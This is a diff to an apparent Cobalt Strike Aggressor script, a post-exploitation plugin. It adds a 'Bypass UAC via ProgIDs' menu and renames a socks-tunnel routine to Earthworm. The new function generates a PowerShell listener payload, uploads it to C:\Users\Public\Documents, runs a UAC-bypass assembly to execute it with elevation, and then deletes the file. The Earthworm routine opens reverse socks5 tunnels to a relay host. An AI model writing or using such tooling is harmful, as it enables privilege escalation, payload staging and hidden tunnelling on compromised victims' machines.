@@ -86,7 +86,7 @@ sub Open_rdp{
 #     btask($bid, "migrating process location to ".$dir.$process.", please wait new session !", "");
 # }
 
-sub Socks{
+sub Earthworm{
     local('$type $lport $refhost $refport $rch');
     $type = $3['type'];
     $lport = $3['listenport'];
@@ -104,6 +104,31 @@ sub Socks{
     else{
         bshell!($bid, $rch.".exe -s rssocks -d ".$refhost." -e ".$refport);
         btask($bid, "Started socks5 server at: ".$refhost.":".$refport);
+    }
+}
+
+sub UacviaProgIDs{
+    local('$type $bin $listener $arg $fname');
+    $type = $3['type'];
+    $bin = $3['path'];
+    $listener = $3['listener'];
+    $fname = Getname().".cmd";
+    $rfname = "C:\\Users\\Public\\Documents\\".$fname;
+    if($type eq "RunBin" && $bin ne ""){
+        btask($bid, "Tasked Beacon to run Bypass UAC via ProgIDs");
+        $arg = join(' ', @($bin));
+        bexecute_assembly!($bid, script_resource("post/ProgIDsUACBypass.exe"),$arg);
+    }
+    else if($type eq "Spawn" && $listener ne ""){
+        btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " Bypass UAC via ProgIDs");
+        $payload = powershell($listener, false);
+        bupload_raw!($bid,$rfname,$payload);
+        $arg = join(' ', @($rfname));
+        bexecute_assembly!($bid, script_resource("post/ProgIDsUACBypass.exe"),$arg);
+        bshell!($bid,"cmd.exe /C del /F ".$rfname);
+    }
+    else{
+        show_error("Error");
     }
 }
 #append menus
@@ -136,6 +161,20 @@ sub Socks{
                 }
                 item "Power off"{
                     bshell($1,"shutdown -s -t 0");
+                }
+            }
+
+
+            menu "UAC"{
+                item "Bypass uac via ProgIDs"{
+                    $bid = $1['@'];
+                    $dialog = dialog("Bypass UAC via ProgIDs",%(bid => $bid, path => 'C:\\Windows\\System32\\notepad.exe'), &UacviaProgIDs);
+                    dialog_description($dialog, "Bypass UAC via ProgIDs.");
+                    drow_combobox($dialog,"type","Type: ", @("RunBin", "Spawn"));
+                    drow_text($dialog,"path","Bin path(type 1): ");
+                    drow_listener($dialog, "listener", "Listener(type 2): ");
+                    dbutton_action($dialog, "Go");
+                    dialog_show($dialog); 
                 }
             }
             
@@ -181,16 +220,19 @@ sub Socks{
             #     dbutton_action($dialog, "Exec");
             #     dialog_show($dialog);
             # }
+            menu "Socks Server" {
 
-            item "Socks tunnel"{
-                $bid = $1['@'];
-                $dialog = dialog("Create socks server",%(bid => $bid, listenport => "1080", refhost => "1.1.1.1", refport => "8888"), &Socks);
-                dialog_description($dialog,"Create a forward or reverse socks5 server use Earthworm.");
-                drow_combobox($dialog, "type", "Type: ", @("Forward", "Reverse"));
-                drow_text($dialog, "listenport", "Listen port(-l): ", "");
-                drow_text($dialog, "refhost", "Reflection host address(-d): ", "");
-                drow_text($dialog, "refport", "Reflection port(-e): ", "");
-                dbutton_action($dialog, "Exec");
-                dialog_show($dialog);
+                item "Earthworm"{
+                    $bid = $1['@'];
+                    $dialog = dialog("Create socks server",%(bid => $bid, listenport => "1080", refhost => "1.1.1.1", refport => "8888"), &Earthworm);
+                    dialog_description($dialog,"Create a forward or reverse socks5 server use Earthworm.");
+                    drow_combobox($dialog, "type", "Type: ", @("Forward", "Reverse"));
+                    drow_text($dialog, "listenport", "Listen port(-l): ", "");
+                    drow_text($dialog, "refhost", "Reflection host address(-d): ", "");
+                    drow_text($dialog, "refport", "Reflection port(-e): ", "");
+                    dbutton_action($dialog, "Exec");
+                    dialog_show($dialog);
+                }
             }
+            
     }
